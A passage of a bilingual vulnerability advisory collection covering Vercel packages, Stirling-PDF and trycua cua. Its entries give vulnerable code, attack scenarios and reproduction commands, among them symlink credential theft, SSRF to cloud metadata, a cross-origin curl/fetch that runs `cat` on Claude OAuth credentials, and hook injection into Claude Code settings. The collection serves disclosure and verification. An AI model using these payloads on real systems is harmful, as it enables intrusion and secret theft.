| **42** | [`42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md`](advisories/zh-CN/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md)<br/>`VERCEL-FLAGS-CORE-06`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/flags** (`@vercel/flags-core <= 1.10.2`)<br/>`packages/flags-core/src/controller.ts:555-615`<br/>`packages/flags-core/dist/index.js:465-516` (`streamResponse` / `readBundledDefinitions`) | `CWE-400 / CWE-345`<br/>**6.5 Medium**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H` | **How It Happens in Code:** `Controller.streamResponse()` (`controller.ts:555-615`) updates `datafileUpdatedAtWatermark` from the unprefixed `x-datafile-Updated-At` header even on non-`200` responses before validating the datafile payload.<br/>**Scenario A (Kill-Switch Lockout):** Poisoning `x-datafile-Updated-At: 9999999999999` makes the SDK ignore all subsequent legitimate flag updates.<br/>**Scenario B (Missing `redirect: 'manual'`):** Stream fetch follows `3xx` redirects.<br/>**Scenario C (Worker State Drift):** Long-lived Node workers remain permanently frozen on stale flags. | `RED`: `poisoned_watermark: 9999999999999, bundled_update_ignored: true`<br/>`GREEN`: `requires_res_ok_and_bounded_skew: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
| **43** | [`43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md`](advisories/zh-CN/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md)<br/>`VERCEL-FLAGS-05`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/flags** (`flags <= 4.4.0`)<br/>`packages/flags/src/next/precompute.ts:206-214`<br/>`packages/flags/dist/next/index.js:119-125` (`deserialize`) | `CWE-347`<br/>**6.5 Medium**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `deserialize(flags, code, secret)` (`precompute.ts:206-214`) returns `{}` when `code === '__no_flags__'` before verifying the Compact JWS signature, even when `flags.length > 0`.<br/>**Scenario A (Edge Gate Bypass):** Requesting `/__no_flags__/page` skips JWS verification and forces fallback `flag.decide()` execution.<br/>**Scenario B (Cohort Manipulation):** Unauthenticated clients reset signed Edge precomputed cohorts.<br/>**Scenario C (Origin Re-Decide Load):** Forces asynchronous `decide()` execution on precomputed routes. | `RED`: `deserialize('__no_flags__'): {}, getPrecomputed_bypassed_edge_false_to_true: true`<br/>`GREEN`: `requires_flags_length_zero_for_sentinel: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
| **44** | [`44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md`](advisories/zh-CN/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md)<br/>`VERCEL-FIREWALL-01`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/firewall** (`@vercel/firewall <= 1.2.6`)<br/>`packages/firewall/src/rate-limit.ts:138-183, 211-285`<br/>`cmd/ipc-proxy/client.go:34-41, 79-97` | `CWE-918 / CWE-200 / CWE-636`<br/>**7.2 High**<br/>`AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N` | **How It Happens in Code:** `resolveFirewallHost()` (`rate-limit.ts:138-167`) uses the untrusted `Host` header as the outbound HTTPS target when `VERCEL_ENV !== 'production'`, leaking `x-vercel-rate-limit-secret` and `x-vercel-oidc-token`, and fails open (`{ rateLimited: false }`) on errors.<br/>**Scenario A (Secret Exfiltration):** Forged `Host` header steals `VF_RATE_LIMIT_SECRET`.<br/>**Scenario B (Fail-Open Brute-Force):** Malformed `Host` triggers `{ rateLimited: false }` on login/OTP endpoints.<br/>**Scenario C (Go `ipc-proxy` `%s` Bug):** `client.go:38` leaves literal `%s` in `api-%s.vercel.com`. | `RED`: `leaked_rate_limit_secret: rl_secret_LIVE_99887766, fail_open_rateLimited: false`<br/>`GREEN`: `strict_hostname_regex_and_sprintf_fixed: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
| **45** | [`45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md`](advisories/zh-CN/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md)<br/>`VERCEL-CLIENT-08A`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`@vercel/client <= 18.10.0`)<br/>`packages/client/src/utils/hashes.ts:115-167`<br/>`packages/client/src/deploy.ts:127-195` (`filesFromFilePathMap`) | `CWE-200 / CWE-706`<br/>**5.0 Medium**<br/>`AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N` | **How It Happens in Code:** `filesFromFilePathMap()` (`packages/client/src/utils/hashes.ts:115-167`) resolves `.vc-config.json` `filePathMap` entries via `path.resolve(cwd, filePath)` without root confinement or `.vercelignore` filtering.<br/>**Scenario A (`.next/required-server-files.json` Leak):** Uploads local `.env` secrets despite `.vercelignore`.<br/>**Scenario B (CI Prebuilt Artifact Traversal):** `../../` entries in `filePathMap` upload host secrets to `/v2/files`.<br/>**Scenario C (Build Cache Poisoning):** Restored `.vc-config.json` exfiltrates runner files. | `RED`: `outside_host_secret_uploaded: true, dotnext_env_secret_uploaded: true`<br/>`GREEN`: `path_confined_to_cwd: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
| **46** | [`46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md`](advisories/zh-CN/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md)<br/>`VERCEL-CLIENT-08B`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`@vercel/client <= 18.10.0`)<br/>`packages/client/src/utils/index.ts:116-148`<br/>`packages/client/src/deploy.ts:145-195` (`buildFileTree` / `bulkRedirectsPath`) | `CWE-59 / CWE-200`<br/>**5.0 Medium**<br/>`AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N` | **How It Happens in Code:** `buildFileTree()` (`packages/client/src/utils/index.ts:116-148`) resolves `config.bulkRedirectsPath` without `fs.realpath()` root confinement or `.vercelignore` filtering, following symlinks outside `cwd`.<br/>**Scenario A (Symlink Host Read):** Symlink inside `bulkRedirectsPath` uploads `/etc/hostname` or `~/.ssh/id_rsa`.<br/>**Scenario B (`../` Directory Walk):** Parent traversal enumerates and uploads outside directories.<br/>**Scenario C (`.vercelignore` Bypass):** Ignored secret files are uploaded in prebuilt mode. | `RED`: `symlink_target_outside_cwd_uploaded: true`<br/>`GREEN`: `realpath_confinement_and_lstat_enforced: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |

---

### III.01 — Stirling-PDF (`v3.2.2`) — 监控文件夹（`Watched Folder`）符号链接（`Symlink`）逃逸绕过 `FolderAccessGuard`（`GHSA-hpc7-xx5r-gc44`，`CWE-59`/`CWE-61`，CVSS `7.1 High`）

#### 1. 元数据与披露状态
* **目标仓库与软件包：** `Stirling-Tools/Stirling-PDF`（`Maven: stirling.software:stirling-pdf`）
* **受影响版本与组件：** `<= v3.2.2`（`commit 684608d143779bf3a8ffc67639f077a1202c62ff`）— `FolderInputSource.java`（`listFiles`，第 `337-377` 行）、`ProcessingFolderController.java`（第 `374-380` 行）、`FolderOutputSink.java`（`archiveOriginal`，第 `338-345` 行）
* **漏洞类型与评分：** `CWE-59`（文件访问前链接解析不当）/ `CWE-61`（UNIX 符号链接跟随）— **CVSS v3.1: `7.1 High`**（`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`）
* **GitHub GHSA 链接：** `GHSA-hpc7-xx5r-gc44`（`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-hpc7-xx5r-gc44`）
* **Sniper 独立安全公告：** [`docs/advisories/zh-CN/01-STIRLING-CAND-02-SYMLINK.md`](advisories/zh-CN/01-STIRLING-CAND-02-SYMLINK.md)

#### 2. 漏洞如何在代码中产生并转化为安全风险（通俗易懂的分步讲解）
Stirling-PDF 的 **自动监控文件夹（Watched Folder）** 功能用于自动读取企业共享目录（例如 `/mnt/scanner-incoming`）中的文档，处理后输出至结果目录（`/mnt/scanner-processed`）。为了防止该功能读取服务器自身的敏感配置文件（如 `/configs/settings.yml`），开发者编写了名为 `FolderAccessGuard.isProtected(path)` 的安全守卫。

然而，Java 标准库的文件判断方法 `Files.isRegularFile(path)` 有一个极易被忽视的特性：**如果不传入第二个参数 `LinkOption.NOFOLLOW_LINKS`，它会自动跟随符号链接（快捷方式 / symlink）**，只要目标文件是普通文件就会返回 `true`！与此同时，`FolderAccessGuard.isProtected(path)` 仅检查文件在监控目录中的表面字面路径（`path.toAbsolutePath().normalize()`），而不解析符号链接指向的真实物理路径（`toRealPath()`）。

`FolderInputSource.java:337-350` 中的漏洞源码如下：
```java
private static List<Path> listFiles(
        Path inputDir, boolean recursive, FolderAccessGuard accessGuard) throws IOException {
    List<Path> files = new ArrayList<>();
    if (!recursive) { // 默认模式：recursive = false
        try (Stream<Path> entries = Files.list(inputDir)) {
            entries.filter(Files::isRegularFile) // 缺陷 1：未传入 LinkOption.NOFOLLOW_LINKS，自动跟随符号链接！
                    .filter(file -> !hidden(file)) // 缺陷 2：此处甚至未调用 accessGuard.isProtected(file)！
                    .forEach(files::add);
        }
        return files;
    }
```
随后，即便 `ProcessingFolderController.java:374` 调用了 `accessGuard.isProtected(path)`，由于传入的表面路径是 `/mnt/scanner-incoming/invoice.pdf`，守卫会判定为安全并放行。最终 `FolderOutputSink.java:342` 执行 `Files.move(originalFile, archiveTarget)` 或 `Files.copy` 时，会把符号链接指向的受保护文件复制到所有人可读的输出/归档目录中。

#### 3. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 通过办公复合机/扫描仪共享文件夹（SMB/NFS）窃取管理员口令与 OAuth 密钥：**
  1. 企业部署 Stirling-PDF 监控 `/mnt/office-scanner/incoming` 共享目录，并将处理结果输出至 `/mnt/office-scanner/processed`。
  2. 拥有共享目录写入权限的普通员工或受控终端创建符号链接 `ln -s /configs/settings.yml /mnt/office-scanner/incoming/invoice_2026.pdf`。
  3. Stirling-PDF 轮询任务将该符号链接当作普通文件处理并归档，导致 `/configs/settings.yml` 中的管理员密码哈希、OAuth2 客户端密钥、SMTP 凭据及 API 密钥被直接复制到公共输出目录。
* **场景 B — SFTP / Nextcloud 自动文档接入流水线中 `archiveOriginal()` 移走线上配置文件导致服务崩溃（DoS）：**
  1. 外部合作方通过 SFTP 投递目录向 Stirling-PDF 传输待处理单据，且系统开启了处理后归档原文件功能。
  2. 攻击者上传指向应用数据文件或 `.env` / 配置文件的符号链接。
  3. `FolderOutputSink.archiveOriginal()` 调用 `Files.move` 将真实配置文件移入归档目录，导致 Stirling-PDF 服务因配置丢失而中断。
* **场景 C — 多租户部门文件夹之间跨目录窃取机密人事与财务文档：**
  1. 同一实例监控多个部门目录（如人事部 `/watched/hr` 与销售部 `/watched/sales`）。
  2. 销售部目录访问者放入 `ln -s /watched/hr/payroll_2026.pdf /watched/sales/scan01.pdf`。
  3. 因缺少 `staysWithinCanonicalRoot` 真实根目录边界检查，人事部的机密薪资 PDF 被复制到了销售部的输出目录。

#### 4. 示例执行、复现与验证命令
```bash
# 1. 使用 Sniper SAST 引擎审计 Stirling-PDF 监控目录模块
python3 scripts/sniper-project-audit /path/to/Stirling-PDF --format json --output stirling-audit.json

# 2. 在本地隔离测试环境中运行 RED -> GREEN 运行时证明
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_stirling_cand02 -v

# 3. 查看运行时证明 JSON 输出
python3 -c 'import json; d=json.load(open("docs/advisories/other-repos-and-cua-real-world-impact-e2e-20261029.json")); print(json.dumps(d["results"]["STIRLING-CAND-02"], indent=2))'
```
**实测运行时证明输出（`RED -> GREEN`）：**
```json
{
  "RED": {
    "recursive": false,
    "symlink_accepted": true,
    "protected_settings_exfiltrated": true,
    "exfiltrated_secret_snippet": "admin_api_key: sk-live-stirling-9988776655"
  },
  "GREEN": {
    "recursive": false,
    "symlink_accepted": false,
    "protected_settings_exfiltrated": false,
    "regular_file_processed": true
  }
}
```

---

### III.02 — Stirling-PDF (`v3.2.2`) — `ConvertWebsiteToPDF.java` 中 `CVE-2026-71270` 修复不完整导致 WeasyPrint 子资源 SSRF（`GHSA-ff6j-8xch-j8r6`，`CWE-918`，CVSS `8.6 High`）

#### 1. 元数据与披露状态
* **目标仓库与软件包：** `Stirling-Tools/Stirling-PDF`（`Maven: stirling.software:stirling-pdf`）
* **受影响版本与组件：** `<= v3.2.2`（`commit 684608d143779bf3a8ffc67639f077a1202c62ff`）— `ConvertWebsiteToPDF.java`（`urlToPdf`，第 `116-143` 行 — `POST /api/v1/convert/url/pdf`）
* **漏洞类型与评分：** `CWE-918`（服务端请求伪造 / SSRF）— **CVSS v3.1: `8.6 High`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`）
* **GitHub GHSA 链接：** `GHSA-ff6j-8xch-j8r6`（`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-ff6j-8xch-j8r6` — `CVE-2026-71270` / `GHSA-j5rg-wh78-9f2q` 的不完整修复）
* **Sniper 独立安全公告：** [`docs/advisories/zh-CN/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/zh-CN/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)

#### 2. 漏洞如何在代码中产生并转化为安全风险（通俗易懂的分步讲解）
此前 Stirling-PDF 曾修复过编号为 `CVE-2026-71270`（`GHSA-j5rg-wh78-9f2q`）的漏洞：当使用 WeasyPrint 将 HTML 渲染为 PDF 时，WeasyPrint 会自动请求 HTML 内部的 `<link>`、`<img>`、`@import` 子链接，从而引发内网 SSRF。当时官方在上传 HTML 文件的 `FileToPdf.java` 中加上了 HTML 净化器并将 WeasyPrint 限制为 `--allowed-protocols data`。

然而，紧邻的“网页 URL 转 PDF”接口 `ConvertWebsiteToPDF.java`（`POST /api/v1/convert/url/pdf`）却遗漏了这两项关键修复：
```java
// app/core/src/main/java/stirling/software/SPDF/controller/api/converters/ConvertWebsiteToPDF.java:116-143
String htmlContent = fetchRemoteHtml(URL); // 仅对顶层 URL 执行了 SsrfProtectionService 检查
// 缺陷 1：未调用 customHtmlSanitizer.sanitize(htmlContent) 清洗 HTML 内的子资源链接！
Files.writeString(tempHtmlInput, htmlContent, StandardCharsets.UTF_8);

List<String> command = new ArrayList<>();
command.add(runtimePathConfig.getWeasyPrintPath());
command.add(tempHtmlInput.toString());
command.add("--base-url");
command.add(URL);
command.add("--pdf-forms");
command.add("--allowed-protocols");
command.add("data,http,https"); // 缺陷 2：允许 WeasyPrint 原生子进程任意发起 http/https 请求！
```
因此，攻击者只需提交一个合法的公网网页 URL（从而通过顶层 `fetchRemoteHtml` 检查），并在该网页 HTML 内嵌入指向 `http://127.0.0.1:...` 或云元数据 `http://169.254.169.254/...` 的 `<link rel="stylesheet">` 或 `<img>`，**完全脱离 Java 安全管控的 WeasyPrint 子进程就会直接拉取内网敏感数据，并将其渲染进生成的 PDF 文件返回给攻击者**。

#### 3. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 云端部署的发票/网页归档 PDF 服务泄露云主机 IAM 临时凭据：**
  1. 企业 SaaS 平台调用 Stirling-PDF 的 `/api/v1/convert/url/pdf` 将用户提交的外部账单网页转换为 PDF。
  2. 攻击者提交的公网页面中包含指向云元数据端点（`169.254.169.254`）或本地配置接口的样式表与内联框架子资源。
  3. WeasyPrint 拉取内网响应并将其直接印在返回的 PDF 页面上，攻击者下载 PDF 即可读取云 IAM 密钥。
* **场景 B — 穿透 `SsrfProtectionService` 扫描并读取 Kubernetes / Docker 内网微服务：**
  1. Stirling-PDF 所在容器的同一 Pod 或内网网段运行着未鉴权的管理接口（如 `http://127.0.0.1:8080/actuator/env` 或 `http://10.0.0.12:9090/metrics`）。
  2. 直接向接口提交 `127.0.0.1` 会被 Java 拦截，但通过公网 HTML 内的 `@import url("http://127.0.0.1:8080/...")` 即可由 WeasyPrint 绕过检查读取内网响应。
* **场景 C — 利用 HTTP `302` 跳转将防火墙后的内部管理后台截图渲染为 PDF：**
  1. 外部网页中的 `<img src="https://attacker.example/redirect">` 返回 `302 Found` 指向企业内网后台地址，WeasyPrint 跟随重定向并将内网页面内容渲染进 PDF。

#### 4. 示例执行、复现与验证命令
```bash
# 1. 在源码中核查 ConvertWebsiteToPDF.java 的 --allowed-protocols 参数
grep -n -C 12 "allowed-protocols" /path/to/Stirling-PDF/app/core/src/main/java/stirling/software/SPDF/controller/api/converters/ConvertWebsiteToPDF.java

# 2. 运行基于本地环回（127.0.0.1）的隔离端到端验证测试
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_stirling_cand01 -v
```
**实测运行时证明输出（`RED -> GREEN`）：**
```json
{
  "RED": {
    "weasyprint_allowed_protocols": "data,http,https",
    "internal_subresource_fetched": true,
    "internal_data_embedded_in_pdf": true,
    "internal_loopback_hit_count": 1
  },
  "GREEN": {
    "weasyprint_allowed_protocols": "data",
    "internal_subresource_fetched": false,
    "internal_data_embedded_in_pdf": false,
    "internal_loopback_hit_count": 0
  }
}
```

---

### III.03 — TryCua `cuabot` (`<= 1.0.16`) — 无认证 `0.0.0.0:7842` 守护进程 + `POST /bash` 通配符 CORS + 无源校验 WebSocket + 可写宿主机 `.claude` 挂载（`GHSA-cp36-x5hg-3gg8`，`CWE-306`/`CWE-942`，CVSS `9.6 Critical`）

#### 1. 元数据与披露状态
* **目标仓库与软件包：** `trycua/cua`（`npm: cuabot <= 1.0.16`）
* **受影响版本与组件：** `>= 1.0.1, <= 1.0.16`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cuabot/src/cuabotd.ts`（第 `34-36, 259-260, 741-743, 969-1002, 1018-1063, 1120` 行）
* **漏洞类型与评分：** `CWE-306`（关键功能缺少身份验证）/ `CWE-942`（过度宽松的跨域白名单）— **CVSS v3.1: `9.6 Critical`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`）
* **GitHub GHSA 链接：** `GHSA-cp36-x5hg-3gg8`（`https://github.com/trycua/cua/security/advisories/GHSA-cp36-x5hg-3gg8`）
* **Sniper 独立安全公告：** [`docs/advisories/zh-CN/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/zh-CN/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)

#### 2. 漏洞如何在代码中产生并转化为安全风险（通俗易懂的分步讲解）
`cuabot` 的后台守护进程 `cuabotd.ts` 同时叠加了 4 个致命缺陷：
1. **在全网卡 `0.0.0.0:7842` 上无认证监听：** `server.listen(port, ...)`（第 `1120` 行）未指定绑定地址，默认对整个局域网和本地环回开放且没有任何 Token 校验。
2. **对所有接口返回 `Access-Control-Allow-Origin: *`：**
   ```typescript
   // libs/cuabot/src/cuabotd.ts:967-974
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   if (req.method === 'OPTIONS') {
     res.writeHead(200);
     res.end();
     return;
   }
   ```
3. **直接执行 Shell 命令的 `POST /bash` 与不校验 `Origin` 的 WebSocket 终端：** `/bash` 接收 JSON `{"command": "..."}` 后直接执行并返回输出；`WebSocketServer`（第 `741` 行）允许任意网页建立交互式 PTY 会话。
4. **可写挂载宿主机的 `.claude` 凭据目录：** 容器将宿主机 `~/.cuabot/user/.claude` 以读写模式挂载到 `/home/community-user/.claude`（第 `259-260` 行）。

这意味着只要开发者运行了 `cuabot`，当其在浏览器中打开任何普通网页或恶意广告时，网页中的 JavaScript 就能直接请求 `http://localhost:7842/bash` 执行任意命令并读走 Claude OAuth 凭据。

#### 3. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 开发者浏览网页时遭路过式（Drive-By）跨域 RCE 并被窃取 Claude OAuth 凭据：**
  1. 开发者在本地运行 `npx cuabot`，同时使用浏览器查阅技术文章。
  2. 网页脚本发起 `fetch("http://localhost:7842/bash", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({command: "cat /home/community-user/.claude/.credentials.json"})})`。
  3. 浏览器因 `Access-Control-Allow-Origin: *` 放行预检请求并将响应体（Claude OAuth 访问令牌与刷新令牌）直接交给网页脚本。
* **场景 B — 向可写挂载的 `/home/community-user/.claude/settings.json` 注入持久化 `PreToolUse` 钩子穿透宿主机：**
  1. 恶意网页通过 `POST /bash` 或跨站 WebSocket 劫持（`ws://localhost:7842/?command=bash`）修改 `/home/community-user/.claude/settings.json`。
  2. 攻击者在配置文件中写入恶意的 `hooks.PreToolUse` 命令。
  3. 此后开发者在宿主机上运行 Claude Code 时，恶意的宿主机命令被自动触发执行。
* **场景 C — 咖啡馆、共享办公或办公室 Wi-Fi（`0.0.0.0:7842`）局域网内的设备直接接管电脑并截取屏幕：**
  1. 同一无线网络中的攻击者扫描发现 `7842` 端口开放，无需认证即可调用 `GET /screenshot` 实时窥探开发者屏幕，并调用 `POST /bash` 远程控制工作站。

#### 4. 示例执行、复现与验证命令
```bash
# 1. 在本地隔离验证环境中模拟浏览器跨域请求（Origin: https://evil.example）
curl -i -X POST http://127.0.0.1:7842/bash \
  -H "Origin: https://evil.example" \
  -H "Content-Type: application/json" \
  -d '{"command":"id && cat /home/community-user/.claude/.credentials.json"}'

# 2. 运行 Sniper 自动化端到端验证测试（RED -> GREEN + BENIGN）
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand01 -v
```
**实测运行时证明输出（`RED -> GREEN + BENIGN`）：**
```json
{
  "RED": {
    "http_status": 200,
    "access_control_allow_origin": "*",
    "driveby_bash_executed": true,
    "mounted_host_claude_credentials_exfiltrated": true
  },
  "GREEN": {
    "http_status": 403,
    "driveby_bash_executed": false,
    "mounted_host_claude_credentials_exfiltrated": false,
    "error": "Cross-origin browser requests forbidden"
  },
  "BENIGN": {
    "http_status": 200,
    "stdout": "authorized_cli_ok"
  }
}
```

---

### III.04 — TryCua `cua-bench-rl` (`<= 0.1.0`) — `0.0.0.0:8001` Worker Server 通配符 CORS + 失效放行 `OSGYM_ALLOWED_IPS` + 无认证 `POST /reset` 任意模块执行（`GHSA-xm8w-gj3g-4f25`，`CWE-94`/`CWE-942`，CVSS `8.8 High`）

#### 1. 元数据与披露状态
* **目标仓库与软件包：** `trycua/cua`（`pip: cua-bench-rl <= 0.1.0` 与 `cua-bench <= 0.3.1`）
* **受影响版本与组件：** `<= 0.1.0`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py`（第 `79-108, 338-360, 499` 行）及 `libs/cua-bench/cua_bench/core.py`（`make`，第 `25-51` 行）
* **漏洞类型与评分：** `CWE-94`（代码生成控制不当）/ `CWE-942`（过度宽松的跨域白名单）— **CVSS v3.1: `8.8 High`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`）
* **GitHub GHSA 链接：** `GHSA-xm8w-gj3g-4f25`（`https://github.com/trycua/cua/security/advisories/GHSA-xm8w-gj3g-4f25`）
* **Sniper 独立安全公告：** [`docs/advisories/zh-CN/04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/zh-CN/04-CUA-CAND-02-WORKER-SERVER-RCE.md)

#### 2. 漏洞如何在代码中产生并转化为安全风险（通俗易懂的分步讲解）
在强化学习工作节点 `worker_server.py` 中，开发者编写了 `ip_filter_middleware` 试图限制访问来源，但由于以下 3 处逻辑失误导致防线完全失效：
```python
# libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py:79-105
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], # 缺陷 1：允许任意外部网站通过浏览器发起跨域请求！
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.middleware("http")
async def ip_filter_middleware(request: Request, call_next):
    allowed_ips = os.environ.get("OSGYM_ALLOWED_IPS", "127.0.0.1").split(",")
    allowed_ips = [ip.strip() for ip in allowed_ips if ip.strip()]
    client_ip = request.client.host if request.client else None
    # 缺陷 2：本地浏览器访问 http://127.0.0.1:8001 时，client_ip 恒为 "127.0.0.1"，直接绕过 IP 过滤！
    # 缺陷 3：当 OSGYM_ALLOWED_IPS="" 为空字符串时，allowed_ips 列表为空，`if allowed_ips:` 为 False，对全网所有 IP 失效放行！
    if allowed_ips and client_ip not in allowed_ips:
        return JSONResponse(status_code=403, content={"detail": f"Access denied for IP: {client_ip}"})
    return await call_next(request)
```
而 `POST /reset` 接口会将请求体中的 `env_path` 传给 `cua_bench.core.make(req.env_path)`（`core.py:38-51`），该函数直接在宿主机 Python 进程中查找 `<env_path>/main.py` 并调用 **`spec.loader.exec_module(module)`** 执行任意 Python 代码。

#### 3. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — AI 研究员在本地运行 RL Worker 时浏览网页触发跨域 `exec_module` RCE：**
  1. 研究员在工作站启动 `worker_server.py` 后使用浏览器查阅网页。
  2. 网页触发浏览器自动下载包含 `main.py` 的文件夹至本地目录，并调用 `fetch("http://127.0.0.1:8001/reset", {method: "POST", body: JSON.stringify({env_path: "/tmp/untrusted_env", task_index: 0})})`。
  3. 请求通过 `127.0.0.1` IP 检查并在宿主机 Python 进程中执行 `main.py`，窃取 GPU 节点的 SSH 密钥与模型训练凭据。
* **场景 B — Kubernetes / Docker Compose 部署中将 `OSGYM_ALLOWED_IPS=""` 留空导致集群全网无认证 RCE：**
  1. 运维人员在容器编排配置中将 `OSGYM_ALLOWED_IPS` 留空以为会禁用外部访问，实则触发 `if allowed_ips:` 失效放行（Fail-Open）。
  2. 集群或局域网内的任何节点均可直接请求 `0.0.0.0:8001/reset` 在宿主机或容器内执行任意 Python 模块。
* **场景 C — 未授权调用 `/screenshot` 与 `/step` 窃取桌面画面并注入键鼠操作：**
  1. 攻击者通过跨域脚本或局域网轮询 `GET /screenshot` 获取实时桌面图像，并通过 `POST /step` 模拟鼠标点击与键盘输入。

#### 4. 示例执行、复现与验证命令
```bash
# 1. 在本地隔离验证环境中复现跨域 POST /reset
curl -i -X POST http://127.0.0.1:8001/reset \
  -H "Origin: https://evil.example" \
  -H "Content-Type: application/json" \
  -d '{"env_path":"/tmp/poc_env","task_index":0}'

# 2. 运行 Sniper E2E 验证测试（RED -> GREEN + BENIGN）
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand02 -v
```
**实测运行时证明输出（`RED -> GREEN + BENIGN`）：**
```json
{
  "RED": {
    "cross_origin_reset_status": 200,
    "empty_allowed_ips_remote_lan_status": 200,
    "arbitrary_env_path_exec_module_rce": true
  },
  "GREEN": {
    "cross_origin_reset_status": 403,
    "empty_allowed_ips_remote_lan_status": 403,
    "outside_env_path_status": 400,
    "arbitrary_env_path_exec_module_rce": false
  },
  "BENIGN": {
    "loopback_valid_task_reset_status": 200
  }
}
```

---

### III.05 — TryCua `cua-compat` (`<= 0.8.0`) — Daytona S3 分片上传 `uploadId` 路径遍历与无条件 `tokio::fs::remove_dir_all` 任意目录删除（`GHSA-3x8g-6h2v-8qx9`，`CWE-22`，CVSS `8.1 High`）

#### 1. 元数据与披露状态
* **目标仓库与软件包：** `trycua/cua`（`Cargo: cua-compat <= 0.8.0` / `cua-spacesd <= 0.8.0`）
* **受影响版本与组件：** `<= 0.8.0`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cua/crates/cua-compat/src/daytona/objectstore.rs`（`handle`，第 `320-325, 360-422` 行）
* **漏洞类型与评分：** `CWE-22`（路径遍历）— **CVSS v3.1: `8.1 High`**（`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`）
* **GitHub GHSA 链接：** `GHSA-3x8g-6h2v-8qx9`（`https://github.com/trycua/cua/security/advisories/GHSA-3x8g-6h2v-8qx9`）
* **Sniper 独立安全公告：** [`docs/advisories/zh-CN/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/zh-CN/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)

#### 2. 漏洞如何在代码中产生并转化为安全风险（通俗易懂的分步讲解）
在 Daytona 兼容 S3 对象存储服务（`objectstore.rs`）中，开发者编写了 `object_path(&key)` 来拦截对象键名中的 `..`。然而对于 URL 查询参数中的 **`?uploadId=`，代码没有任何字符或路径校验**。

更严重的是，处理中止分片上传的 `HTTP DELETE` 分支（第 `415-421` 行）存在如下逻辑：
```rust
// libs/cua/crates/cua-compat/src/daytona/objectstore.rs:415-421
(Method::DELETE, Some(id), _, _) => {
    d.objects.uploads.lock().await.remove(&id); // 缺陷 1：完全忽略了该 uploadId 是否真实存在于内存表中！
    // 缺陷 2：将未经校验的 `id` 直接拼接到路径中，并无条件执行 remove_dir_all 递归删除！
    let _ = tokio::fs::remove_dir_all(d.objects.root.join("uploads").join(&id)).await;
    Response::builder()
        .status(StatusCode::NO_CONTENT)
        .body(Full::new(Bytes::new()))
        .unwrap()
}
```
